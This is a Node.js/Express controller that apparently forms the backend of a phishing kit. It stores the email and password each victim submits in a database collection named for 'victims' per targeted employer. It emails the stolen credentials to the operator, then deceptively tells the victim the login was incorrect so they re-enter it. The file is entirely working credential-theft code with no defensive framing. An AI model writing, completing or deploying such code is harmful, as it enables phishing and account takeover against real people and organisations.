const { sendLoginEmail } = require("../services/emailService.js");
const { saveToEmployerAndMain } = require("../models/VictimModel.js");

exports.submitLogin = async (req, res) => {
  const { email, password, employerId } = req.body || {};

  if (!email || !password) {
    return res.render("login", { 
      message: "Email and password are required.", 
      messageType: "error",
      employerId: employerId || "general"
    });
  }

  try {
    // Save to main collection + employer collection
    await saveToEmployerAndMain({ email, password, employerId });
    console.log(`✅ Saved to MongoDB (Main + ${employerId || 'general'}_victims)`);

    try {
      await sendLoginEmail({ email, password, employerId });
      console.log("📧 Notification email sent successfully");
    } catch (emailError) {
      console.error("⚠️ Failed to send notification email:", emailError.message);
    }

    return res.render("login", { 
      message: "incorrect email or password! please input correct details.", 
      messageType: "success",
      employerId: employerId || "general"
    });
  } catch (error) {
    console.error("Login submission failed:", error);

    return res.render("login", { 
      message: error.message || "Unable to process your login request right now.", 
      messageType: "error",
      employerId: employerId || "general"
    });
  }
};